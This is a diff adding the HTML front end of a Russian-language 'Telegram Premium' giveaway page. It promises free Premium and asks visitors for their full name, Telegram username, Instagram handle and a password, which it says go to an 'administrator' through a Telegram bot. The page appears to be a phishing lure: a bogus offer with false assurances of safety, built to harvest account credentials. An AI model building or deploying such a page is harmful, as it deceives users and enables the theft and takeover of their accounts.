@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Premium</title>
+  <link rel="stylesheet" href="styles.css">
+  <script src="script.js" defer></script>
+</head>
+<body>
+  <div class="bg-grid"></div>
+
+  <nav class="nav">
+    <div class="brand">
+      <div class="logo-3d"></div>
+      <h1>Telegram Premium</h1>
+    </div>
+    <div>
+      <a href="#benefits">Преимущества</a>
+      <a href="#form">Заявка</a>
+    </div>
+  </nav>
+
+  <div class="container">
+    <div class="hero">
+      <div class="hero-text">
+        <h2>Получить <span class="grad">Premium</span> стало проще</h2>
+        <p>🌟 Единственный вебсайт, который дарит Telegram Premium 55% своих пользователей! После регистрации вы получите уникальный ID и сможете общаться с администратором.</p>
+      </div>
+
+      <div class="hero-card glass" id="form">
+        <h3>Форма заявки</h3>
+        <form id="premiumForm">
+          <div class="field">
+            <label>Полное имя</label>
+            <input type="text" name="fullName" placeholder="Например: Иван Иванов" required>
+          </div>
+          <div class="field">
+            <label>Telegram Username</label>
+            <input type="text" name="telegram" placeholder="Например: @telegrampremium" required>
+            <div class="hint">Введите ваш Telegram username с @</div>
+          </div>
+          <div class="field">
+            <label>Instagram</label>
+            <input type="text" name="instagram" placeholder="Например: telegrampremium">
+          </div>
+          <div class="field">
+            <label>Пароль</label>
+            <input type="password" name="password" placeholder="Введите пароль" required>
+          </div>
+          <div class="field">
+            <label>Сообщение</label>
+            <textarea name="message" placeholder="Ваше сообщение"></textarea>
+          </div>
+          <div class="consent">
+            <input type="checkbox" id="consent" required>
+            <label for="consent">Я согласен(а) на обработку данных для связи.</label>
+          </div>
+          <button class="btn-cta" type="submit">Отправить</button>
+        </form>
+        <div id="status"></div>
+        <div class="chat-container" id="chatContainer" style="display: none;">
+          <h3>Чат с админом</h3>
+          <div class="chat-messages" id="chatMessages"></div>
+          <div class="field">
+            <input type="text" id="chatInput" placeholder="Введите сообщение">
+            <button class="btn-cta" onclick="sendChatMessage()">Отправить</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="features" id="benefits">
+      <div class="card">
+        <h3>Безопасность</h3>
+        <p>Ваши данные защищены. Пароли и сообщения не передаются третьим лицам.</p>
+      </div>
+      <div class="card">
+        <h3>Отправка администратору</h3>
+        <p>Заявки и сообщения отправляются через Telegram Bot (официальный API).</p>
+      </div>
+      <div class="card">
+        <h3>Telegram Premium ❤️</h3>
+        <p>Получите Telegram Premium после обработки заявки!</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    © <span id="year"></span> Telegram Premium. Все права защищены.
+  </div>
+</body>
+</html>
